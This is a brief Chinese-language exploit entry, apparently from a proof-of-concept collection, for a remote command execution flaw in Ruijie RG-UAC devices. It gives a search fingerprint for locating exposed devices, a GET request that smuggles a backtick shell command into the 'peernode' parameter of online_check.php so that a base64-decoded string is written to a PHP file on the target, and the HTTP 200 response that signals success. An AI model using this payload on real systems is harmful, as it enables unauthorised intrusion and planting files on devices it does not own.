# 锐捷RuijieUAC远程RCE漏洞

锐捷 ｜ 命令执行 ｜ —
- **指纹**：`app="Ruijie-RG-UAC"`

**Payload**
```
GET
/view/vpn/autovpn/online\_check.php?peernode=  `echo ZHVkZXNpdGU=  base64 -d > dudesite.php` HTTP/1.1
```
- **响应特征**：200